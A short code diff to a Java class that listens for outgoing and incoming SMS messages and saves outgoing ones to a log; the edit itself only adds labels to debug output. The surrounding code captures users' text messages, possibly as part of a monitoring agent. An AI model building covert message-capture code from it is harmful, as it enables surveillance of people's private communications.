@@ -23,7 +23,7 @@ public class SMSOUTListener implements OutboundMessageListener{
     
     public void notifyOutgoingMessage(Message message) {
         //#ifdef DEBUG_INFO
-        debug.info(message.getAddress()); //  sms://9813746
+        debug.info("notifyOutgoingMessage: " + message.getAddress()); //  sms://9813746
         //#endif
         
        smsListener.saveLog(message, false);        
@@ -31,7 +31,7 @@ public class SMSOUTListener implements OutboundMessageListener{
 
     public void notifyIncomingMessage(MessageConnection arg0) {
         //#ifdef DEBUG_INFO
-        debug.info(arg0.toString());
+        debug.info("notifyIncomingMessage: " + arg0.toString());
         //#endif        
     }
     
